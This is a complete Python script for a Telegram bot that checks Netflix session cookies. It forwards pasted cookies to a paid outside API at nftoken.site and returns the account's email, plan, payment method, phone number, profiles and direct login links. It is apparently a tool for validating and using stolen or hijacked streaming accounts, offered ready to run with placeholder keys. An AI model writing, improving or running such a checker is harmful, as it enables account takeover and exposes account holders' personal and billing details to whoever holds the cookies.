import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import requests

# ==========================================
# ?? CONFIGURATION - EDIT THESE SETTINGS
# ==========================================
# 1. Get your Bot Token from @BotFather on Telegram
TELEGRAM_BOT_TOKEN = "PUT_YOUR_TELEGRAM_BOT_TOKEN_HERE"

# 2. Paste the API Key you purchased
NFTOKEN_API_KEY = "PUT_YOUR_API_KEY_HERE"

# 3. The API Gateway URL
API_URL = "https://nftoken.site/v1/api.php"
# ==========================================

bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    welcome_text = (
        "?? *Welcome to the Checker Bot!*\n\n"
        "Simply paste your Netflix cookie (JSON or Netscape format) "
        "directly into this chat, and I will check it for you."
    )
    bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown")

@bot.message_handler(func=lambda message: True)
def check_cookie(message):
    raw_text = message.text.strip()
    
    # Basic validation
    if "netflix" not in raw_text.lower() and "NetflixId" not in raw_text and "{" not in raw_text:
        bot.reply_to(message, "?? Please send a valid cookie string.")
        return

    # Send a temporary "Checking..." message
    status_msg = bot.reply_to(message, "? *Checking cookie...*", parse_mode="Markdown")

    payload = {
        "key": NFTOKEN_API_KEY,
        "cookie": raw_text
    }

    try:
        # Send the request to the API
        response = requests.post(API_URL, json=payload, timeout=20)
        data = response.json()

        if data.get("status") == "SUCCESS":
            email = data.get("x_mail", "N/A")
            plan = data.get("x_tier", "Unknown")
            country = data.get("x_loc", "N/A")
            renewal = data.get("x_ren", "N/A")
            since = data.get("x_mem", "N/A")
            payment = data.get("x_bil", "N/A")
            phone = data.get("x_tel", "N/A")
            profiles = data.get("x_usr", "N/A")
            
            # Watch Links
            pc_link = data.get("x_l1", "#")
            mobile_link = data.get("x_l2", "#")
            tv_link = data.get("x_l3", "#")

            # Build a beautiful Telegram message
            result_text = (
                f"? *SUCCESS* | `{email}`\n"
                f"??????????????????\n"
                f"?? *Plan:* `{plan}`\n"
                f"?? *Country:* `{country}`\n"
                f"?? *Renewal:* `{renewal}`\n"
                f"? *Since:* `{since}`\n"
                f"?? *Payment:* `{payment}`\n"
                f"?? *Phone:* `{phone}`\n"
                f"?? *Profiles:* `{profiles}`\n"
                f"??????????????????"
            )
            
            # Create clickable Inline Buttons for the links
            markup = InlineKeyboardMarkup()
            buttons = []
            if pc_link.startswith("http"):
                buttons.append(InlineKeyboardButton("?? PC", url=pc_link))
            if mobile_link.startswith("http"):
                buttons.append(InlineKeyboardButton("?? Mobile", url=mobile_link))
            if tv_link.startswith("http"):
                buttons.append(InlineKeyboardButton("?? TV", url=tv_link))
            
            if buttons:
                markup.row(*buttons)

            bot.edit_message_text(result_text, chat_id=message.chat.id, message_id=status_msg.message_id, parse_mode="Markdown", reply_markup=markup)
        
        elif data.get("status") == "ERROR" and response.status_code == 429:
            error_msg = data.get("message", "Rate limit exceeded.")
            bot.edit_message_text(f"?? *RATE LIMITED*\n{error_msg}", chat_id=message.chat.id, message_id=status_msg.message_id, parse_mode="Markdown")
        
        else:
            error_msg = data.get("message", "Invalid or Dead Cookie")
            bot.edit_message_text(f"? *DEAD ACCOUNT*\n{error_msg}", chat_id=message.chat.id, message_id=status_msg.message_id, parse_mode="Markdown")

    except Exception as e:
        bot.edit_message_text("?? *System Error:* Could not connect to API.", chat_id=message.chat.id, message_id=status_msg.message_id, parse_mode="Markdown")

print("?? Bot is running... Press Ctrl+C to stop.")
bot.infinity_polling()